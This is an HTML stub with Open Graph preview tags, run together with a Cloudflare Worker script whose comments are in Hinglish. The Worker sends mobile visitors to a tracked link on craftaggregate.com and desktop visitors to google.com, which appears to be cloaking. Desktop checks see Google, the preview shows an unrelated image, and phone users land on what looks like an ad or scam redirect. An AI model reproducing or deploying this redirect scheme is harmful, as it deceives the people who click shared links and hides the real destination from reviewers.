<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Page</title>
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://raw.githubusercontent.com/awbhund-art/fafv/refs/heads/main/7981647689944298232.jpg">
    <meta property="og:url" content="https://google.com">
    <meta property="og:type" content="website">
</head>
<body>
    <h1>Welcome</h1>
</body>
</html>
export default {
  async fetch(request, env) {
    const userAgent = request.headers.get("user-agent") || "";
    
    // 1. Mobile user detect karne ka logic
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const isMobileDevice = isMobile || request.cf?.deviceType === "mobile";

    // 2. Agar mobile user hai toh is URL par bhejein
    if (isMobileDevice) {
      return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
    }

    // 3. Agar desktop user hai toh google.com par bhejein
    return Response.redirect("https://google.com", 302);
  },
};
